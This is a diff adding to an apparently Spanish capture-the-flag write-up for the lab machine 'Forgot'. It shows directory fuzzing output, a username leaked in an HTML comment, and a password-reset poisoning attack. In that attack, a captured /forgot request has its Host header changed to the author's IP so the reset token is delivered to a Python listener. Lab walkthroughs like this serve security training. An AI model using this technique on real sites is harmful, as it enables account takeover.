@@ -7,8 +7,7 @@ tags: [Linux, CTF, Easy, SNMP, Port Forwarding, SQLi, PATH Hijacking, CVE, CMS, 
 image:
   path: ../../assets/img/commons/Forgot/Forgot.png
   width: 800
-  height: 450
-  alt: Banner Forgot
+  height: 450 
 ---
 
 ## Reconocimiento
@@ -59,3 +58,66 @@ PORT   STATE SERVICE    VERSION
 |_http-server-header: Varnish
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+Ahora fuzzeamos por directorios a ver qué encontramos.
+
+`Nota:` Nos tiene que aparecer un panel de login en la propia web, si no te aparece reinicia la máquina (me sucedió por eso lo menciono)
+
+```
+❯ wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.188/FUZZ
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                       
+=====================================================================
+
+000000001:   200        245 L    484 W      5186 Ch     "# directory-list-2.3-medium.txt"                                             
+000000007:   200        245 L    484 W      5186 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"             
+000000008:   200        245 L    484 W      5186 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                  
+000000003:   200        245 L    484 W      5186 Ch     "# Copyright 2007 James Fisher"                                               
+000000010:   200        245 L    484 W      5186 Ch     "#"                                                                           
+000000005:   200        245 L    484 W      5186 Ch     "# This work is licensed under the Creative Commons"                          
+000000014:   200        245 L    484 W      5186 Ch     "http://10.10.11.188/"                                                        
+000000006:   200        245 L    484 W      5186 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"               
+000000002:   200        245 L    484 W      5186 Ch     "#"                                                                           
+000000004:   200        245 L    484 W      5186 Ch     "#"                                                                           
+000000013:   200        245 L    484 W      5186 Ch     "#"                                                                           
+000000009:   200        245 L    484 W      5186 Ch     "# Suite 300, San Francisco, California, 94105, USA."                         
+000000012:   200        245 L    484 W      5186 Ch     "# on atleast 2 different hosts"                                              
+000000011:   200        245 L    484 W      5186 Ch     "# Priority ordered case sensative list, where entries were found"            
+000000038:   302        5 L      22 W       189 Ch      "home"                                                                        
+000000053:   200        245 L    484 W      5189 Ch     "login"                                                                       
+000001706:   200        252 L    498 W      5227 Ch     "forgot"                                                                      
+000002357:   302        5 L      22 W       189 Ch      "tickets"                    
+
+```
+## Intrusión
+
+En en código fuente podemos ver un usuario potencial
+
+```html
+<!-- Q1 release fix by robert-dev-145092 -->
+```
+Nos montamos un servidor con python por el puerto 80
+
+```
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Ahora en la ruta **/forgot** que encontramos anteriormente colocamos el usuario que vimos. Realizamos la petición y capturamos la petición con Burpsuite y cambiamos el HOST por nuestra ip y el puerto donde tenemos el servidor
+
+```
+GET /forgot?username=robert-dev-145092 HTTP/1.1
+Host: 10.10.16.47:80
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+Accept: */*
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Referer: http://10.10.11.188/forgot
+```
+Ahora interceptamos la petición de **/reset** colocando el token que nos dio de manera urlencodeada para luego iniciar sesión como **robert-dev-145092**. (Si no te funciona el token a la primera, intenta nuevamente con otro token que te da si te quedaste en escucha con python)
+
+![Burpsuite]({{ 'assets/img/commons/Forgot/Burp.png' | relative_url }}){: .center-image }
+_Petición por Burp_ 
